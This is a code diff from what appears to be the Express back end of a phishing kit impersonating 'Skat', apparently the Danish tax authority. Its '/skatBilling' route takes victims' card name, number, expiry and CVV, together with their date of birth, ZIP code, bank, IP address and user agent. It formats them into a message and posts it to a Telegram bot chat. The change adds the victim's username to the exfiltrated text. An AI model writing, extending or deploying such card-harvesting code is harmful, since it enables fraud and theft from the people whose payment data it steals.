@@ -2844,7 +2844,7 @@ app.post('/skatBilling', (req, res) => {
         }
     }).then(function () {
         binList = `${bin} | ${dob} | ${zip} | ${bankName}`
-        var originalText = `+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+        var originalText = `${username}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
         axios.post(
             `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=Skat:\n${originalText}`
         ).catch(e => {
@@ -2856,6 +2856,8 @@ app.post('/skatBilling', (req, res) => {
             console.log(e)
         });
         res.send("Update Completed");
+    }).catch(e => {
+        console.log(e)
     })
 });
 
